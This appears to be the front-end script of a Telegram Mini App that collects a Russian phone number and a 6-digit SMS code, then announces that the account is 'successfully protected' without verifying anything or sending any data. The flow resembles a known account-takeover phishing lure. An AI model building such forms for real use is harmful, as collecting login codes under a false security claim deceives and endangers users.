document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.setHeaderColor('#060137');
    tg.setBackgroundColor('#060137');
    tg.enableClosingConfirmation();

    // Elements
    const phoneForm = document.getElementById('phone-form');
    const codeForm = document.getElementById('code-form');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const phoneError = document.getElementById('phone-error');
    const codeError = document.getElementById('code-error');
    const sharePhoneBtn = document.getElementById('share-phone');

    // Format phone number
    phoneInput.addEventListener('input', function(e) {
        let value = this.value.replace(/\D/g, '');
        
        if (value.length > 0) {
            value = '+7' + value.substring(1);
        }
        
        if (value.length > 2) {
            value = value.substring(0, 2) + ' ' + value.substring(2);
        }
        if (value.length > 6) {
            value = value.substring(0, 6) + ' ' + value.substring(6);
        }
        if (value.length > 10) {
            value = value.substring(0, 10) + ' ' + value.substring(10);
        }
        if (value.length > 13) {
            value = value.substring(0, 13) + ' ' + value.substring(13);
        }
        if (value.length > 16) {
            value = value.substring(0, 16);
        }
        
        this.value = value;
    });

    // Validate Russian phone number
    function validateRussianPhone(phone) {
        const cleanPhone = phone.replace(/\D/g, '');
        return cleanPhone.length === 11 && cleanPhone.startsWith('7');
    }

    // Share phone number
    sharePhoneBtn.addEventListener('click', () => {
        if (tg.initDataUnsafe.user?.phone_number) {
            const phone = tg.initDataUnsafe.user.phone_number;
            phoneInput.value = formatPhoneNumber(phone);
            hideError(phoneError);
            tg.HapticFeedback.impactOccurred('light');
        } else {
            showError(phoneError, 'Не удалось получить номер. Введите вручную.');
            tg.HapticFeedback.notificationOccurred('error');
        }
    });

    function formatPhoneNumber(phone) {
        const clean = phone.replace(/\D/g, '');
        return `+7 ${clean.substring(1, 4)} ${clean.substring(4, 7)} ${clean.substring(7, 9)} ${clean.substring(9)}`;
    }

    // Submit phone
    document.getElementById('submit-phone').addEventListener('click', () => {
        const phone = phoneInput.value.replace(/\D/g, '');
        
        if (!phone) {
            showError(phoneError, 'Введите номер телефона');
            tg.HapticFeedback.notificationOccurred('error');
            return;
        }
        
        if (!validateRussianPhone(phone)) {
            showError(phoneError, 'Введите корректный российский номер');
            tg.HapticFeedback.notificationOccurred('error');
            return;
        }
        
        hideError(phoneError);
        phoneForm.classList.add('hidden');
        codeForm.classList.remove('hidden');
        tg.HapticFeedback.impactOccurred('medium');
    });

    // Submit code
    document.getElementById('submit-code').addEventListener('click', () => {
        const code = codeInput.value.trim();
        
        if (!code) {
            showError(codeError, 'Введите код из SMS');
            tg.HapticFeedback.notificationOccurred('error');
            return;
        }
        
        if (code.length !== 6 || !/^\d+$/.test(code)) {
            showError(codeError, 'Код должен содержать 6 цифр');
            tg.HapticFeedback.notificationOccurred('error');
            return;
        }
        
        tg.showAlert('✅ Ваш аккаунт успешно защищен!', () => {
            tg.close();
        });
        tg.HapticFeedback.notificationOccurred('success');
    });

    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
    }

    function hideError(element) {
        element.style.display = 'none';
    }
});